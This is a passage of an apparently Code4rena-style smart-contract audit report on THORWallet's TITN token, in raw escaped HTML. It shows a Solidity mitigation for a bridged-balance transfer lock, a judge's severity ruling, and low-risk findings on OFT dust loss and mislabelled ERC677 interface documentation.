class=\"mtk12\"\u003eallowedAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecrement Bridged Balance on Approved Transfers\u003c/strong\u003e:\u003cbr\u003e\nWhen tokens are sent to \u003ccode\u003elzEndpoint\u003c/code\u003e or \u003ccode\u003etransferAllowedContract\u003c/code\u003e, reduce \u003ccode\u003ebridgedBalances\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eBenefits\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePrecision\u003c/strong\u003e: Only bridged tokens are restricted; non-bridged tokens remain freely transferable.  \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNo DoS Vector\u003c/strong\u003e: Attackers cannot lock users’ non-bridged tokens by sending trivial bridged amounts.  \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBackward Compatibility\u003c/strong\u003e: Maintains existing protocol invariants while fixing the critical flaw.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003ecacaomatt (THORWallet) acknowledged\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid, I believe medium is appropriate based on C4 medium severity guidelines, given no assets are compromised/lost. \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eThis only impacts the following invariant on Base.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNon-bridged TITN Tokens: Holders can transfer their TITN tokens freely to any address as long as the tokens have not been bridged from ARBITRUM.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eIf usage of tokens are desired for defi protocols, the tokens can still be bridged via transfers to the LZ endpoint\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X\u0026#x26;commentChild=ME742qfuh2P\"\u003ecacaomatt (THORWallet) acknowledged and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is no longer applicable as our PR to address finding F-9 prevents this from happening in the first place.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 9 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-812\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eSparrow\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-399\"\u003eAnonymous0x1C41\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-732\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-508\"\u003eeta\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-394\"\u003eFitro\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-519\"\u003einh3l\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-662\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-232\"\u003etpiliposian\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-574\"\u003eudo\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\" aria-label=\"qa 01 dust amount loss in cross chain titn token transfers permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-01] Dust Amount Loss in Cross-Chain TITN Token Transfers\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eWhen bridging TITN tokens cross-chain using LayerZero’s OFT standard, small dust amounts are removed to handle decimal precision differences between chains. This affects initial TITN deposits, user claims, and remaining TITN withdrawals.\u003c/p\u003e\n\u003ch3 id=\"vulnerability-details\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerability Details\u003c/h3\u003e\n\u003cp\u003eThe TITN contract inherits from OFT:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003econstructor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_symbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialMintAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eOFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_symbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMergeTgt requires exact amounts:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTITN_ARB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e173_700_000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTITN_ARB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidAmountReceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDue to OFT’s dust removal, bridged amounts may be slightly less than expected, causing transaction failures or minor token losses.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd tolerance for deposit amounts.\u003c/p\u003e\n\u003ch2 id=\"qa-02-interface-documentation-references-wrong-token-standard\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-02-interface-documentation-references-wrong-token-standard\" aria-label=\"qa 02 interface documentation references wrong token standard permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-02] Interface Documentation References Wrong Token Standard\u003c/h2\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eIERC677Receiver\u003c/code\u003e interface documentation incorrectly references \u003ccode\u003eERC1363\u003c/code\u003e instead of \u003ccode\u003eERC677\u003c/code\u003e. This mismatch between the interface name and its documentation could lead to integration issues and developer confusion.\u003c/p\u003e\n\u003cp\u003eThe interface is named \u003ccode\u003eIERC677Receiver\u003c/code\u003e but its documentation comments reference \u003ccode\u003eERC1363\u003c/code\u003e’s \u003ccode\u003etransferAndCall\u003c/code\u003e functionality. While both standards have similar purposes, they have different implementations and requirements. This inconsistency could cause:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIntegration errors if developers implement the wrong standard based on the documentation\u003c/li\u003e\n\u003cli\u003eConfusion during code review and maintenance\u003c/li\u003e\n\u003cli\u003ePotential compatibility issues with other contracts expecting specific standard implementations\nThe impact is low, as this is primarily a documentation issue and does not affect the actual functionality of the code.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe interface in \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L5-L6\"\u003eIERC677Receiver.sol\u003c/a\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@title\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e IERC1363Receiver\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Interface for any contract that wants to support \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`transferAndCall`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e or \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`transferFromAndCall`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e from ERC-1363 token contracts.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe interface is used in \u003ccode\u003eMergeTgt.sol\u003c/code\u003e for handling token transfers, but it’s implementing ERC677 functionality despite the ERC1363 documentation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;./interfaces/IERC677Receiver.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan 